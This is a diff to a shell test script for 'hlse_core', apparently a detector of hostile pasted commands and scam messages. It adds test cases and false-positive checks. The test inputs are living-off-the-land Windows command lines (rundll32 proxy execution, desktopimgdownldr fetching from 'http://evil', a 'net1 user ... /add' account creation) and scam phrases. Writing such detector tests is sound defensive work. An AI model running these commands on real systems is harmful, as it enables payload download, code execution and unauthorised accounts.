@@ -11671,6 +11671,58 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-225: .NET compile chain + rundll32 DLL targets + scam vocab ─
+for c in \
+    'csc.exe /out:e.exe e.cs' \
+    'csc /target:library x.cs' \
+    'vbc.exe /out:e.exe e.vb' \
+    'jsc.exe x.js' \
+    'ilasm.exe x.il' \
+    'resgen.exe x.txt x.resources' \
+    'aspnet_compiler.exe -v / -p c:\x' \
+    'certreq.exe -new request.inf' \
+    'diaghub.exe /payload:e.dll' \
+    'desktopimgdownldr.exe /storageName:y /personalizer:http://evil' \
+    'wlrmdr.exe -s 3600 -f x -m "msg" -o evil.exe' \
+    'rundll32.exe url.dll, FileProtocolHandler c:\evil.exe' \
+    'rundll32.exe zipfldr.dll, RouteTheCall x' \
+    'rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' \
+    'rundll32 advpack.dll,LaunchINFSection x.inf' \
+    'rundll32 shell32.dll,OpenAs_RunDLL x.bat'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'csc.exe' 'ilasm.exe' 'the compiler builds csc files' \
+         'aspnet_compiler help' 'certreq -list' 'certreq -submit id' \
+         'vbc' 'jsc' 'resgen' 'diaghub' 'desktopimgdownldr' 'wlrmdr' \
+         'rundll32.exe url.dll' 'the file protocol handler routes' \
+         'shellexec is an api'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
+for t in 'deposit cash into a bitcoin atm to secure your funds' \
+         'pay using the crypto atm at the store' \
+         'go to the btc atm and send the money' \
+         'your voice has been cloned urgent' \
+         'scammers use voice cloning now' \
+         'join our whatsapp investment group' \
+         'telegram trading signals daily' \
+         'send 50 get 500 cash app flip'; do
+    ./hlse_core text "$t" 2>&1 | grep -qE 'LOG|ALERT|BLOCK|ISOLATE' \
+        && check "text: ${t:0:40} flagged" "0" "0" \
+        || check "text: ${t:0:40} flagged" "0" "1"
+done
+for t in 'i use a bitcoin exchange' 'the atm machine is open' \
+         'voice assistant is helpful' 'telegram group chat invite' \
+         'whatsapp call tonight' 'flip a coin' 'crypto market is volatile'; do
+    ./hlse_core text "$t" 2>&1 | grep -q '^OK' \
+        && check "text FP guard: ${t:0:40} clean" "0" "0" \
+        || check "text FP guard: ${t:0:40} clean" "0" "1"
+done
+
 # ── cycle-224: net1 evasion + UAC-bypass/TAEF LOLBAS + secrets wave-7 ─
 for c in \
     'net1 user hack P@ss /add' \
